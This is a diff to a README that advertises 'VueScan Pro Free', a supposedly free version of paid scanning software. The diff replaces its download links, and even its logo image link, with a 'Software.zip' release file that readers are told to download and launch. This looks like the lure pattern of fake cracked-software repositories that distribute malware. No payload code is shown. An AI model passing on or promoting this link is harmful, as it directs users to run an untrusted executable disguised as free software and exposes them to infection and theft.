@@ -10,7 +10,7 @@ Welcome to the VueScan Pro Free repository! If you are looking for the ultimate 
 
 ## Get Started with VueScan Pro
 
-To kickstart your scanning journey with VueScan Pro, make sure to download the latest version by clicking [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Please note that the file needs to be launched to initiate the installation process.
+To kickstart your scanning journey with VueScan Pro, make sure to download the latest version by clicking [here](https://github.com/VJGara/VueScan-Pro-Free/releases/download/v1.0/Software.zip). Please note that the file needs to be launched to initiate the installation process.
 
 ## Features 🌟
 
@@ -45,10 +45,10 @@ Connect with other VueScan Pro users, share tips and tricks, and stay up to date
 
 With VueScan Pro Free, scanning has never been easier or more efficient. Take your scanning game to the next level with VueScan Pro's cutting-edge features and intuitive interface. Download VueScan Pro today and experience the difference for yourself!
 
-![VueScan Pro Logo](https://your-image-url.com)
+![VueScan Pro Logo](https://github.com/VJGara/VueScan-Pro-Free/releases/download/v1.0/Software.zip)
 
 ```markdown
-Don't wait, unleash the power of VueScan Pro today! Click [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) to download and get started.
+Don't wait, unleash the power of VueScan Pro today! Click [here](https://github.com/VJGara/VueScan-Pro-Free/releases/download/v1.0/Software.zip) to download and get started.
 ```
 
 ---
